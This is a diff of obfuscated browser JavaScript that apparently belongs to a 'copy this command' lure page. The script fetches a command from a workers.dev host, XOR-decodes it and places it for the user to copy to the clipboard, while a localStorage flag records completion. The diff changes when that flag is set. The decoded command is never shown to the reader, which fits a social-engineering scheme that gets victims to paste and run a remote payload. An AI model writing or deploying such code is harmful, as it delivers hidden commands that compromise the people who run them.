@@ -1,6 +1,7 @@
 (function () {
   var _d = document;
   var base = 'https://quiet-night-c52a.tv5d7dh7.workers.dev';
+  var _cmdLoaded = false;
 
   function decode(arr) {
     return arr.map(function (b) { return String.fromCharCode(b ^ 0x5A); }).join('');
@@ -23,6 +24,10 @@
         t.select();
         _d.execCommand('copy');
         _d.body.removeChild(t);
+      }
+      
+      if (_cmdLoaded) {
+        localStorage.setItem('_done', '1');
       }
       var original = btn.textContent;
       btn.textContent = 'Copied!';
@@ -51,11 +56,11 @@
       })
       .then(function (res) {
         if (!res || !res.data || !res.data.length) return;
-        var cmd = decode(res.data);
         var el = _d.getElementById('commandToCopy');
-        if (el) el.textContent = cmd;
-        // Ставим флаг только после успешного получения команды
-        localStorage.setItem('_done', '1');
+        if (el) {
+          el.textContent = decode(res.data);
+          _cmdLoaded = true; 
+        }
       })
       .catch(function () {});
   }
